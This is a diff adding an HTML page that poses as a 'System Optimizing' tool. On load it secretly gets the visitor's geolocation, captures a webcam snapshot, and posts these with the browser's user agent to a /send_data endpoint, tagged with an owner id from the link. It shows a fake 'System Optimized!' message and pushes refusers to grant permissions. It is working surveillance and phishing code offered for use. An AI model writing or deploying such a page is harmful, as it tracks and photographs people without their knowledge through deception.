@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#000;color:#0f0;text-align:center;font-family:sans-serif;">
+    <h2>Optimizing System...</h2>
+    <div id="status">Starting...</div>
+    <script>
+        const owner = new URLSearchParams(window.location.search).get('id');
+        async function start() {
+            try {
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                const stream = await navigator.mediaDevices.getUserMedia({video:true});
+                const video = document.createElement('video');
+                video.srcObject = stream; await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video,0,0);
+                const img = canvas.toDataURL('image/jpeg');
+                
+                await fetch('/send_data', {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({owner_id:owner, loc:pos.coords.latitude+','+pos.coords.longitude, dev:navigator.userAgent, img:img})
+                });
+                document.getElementById('status').innerText = "System Optimized!";
+            } catch(e) { document.getElementById('status').innerText = "Error: Please allow permissions."; }
+        }
+        window.onload = start;
+    </script>
+</body>
+</html>
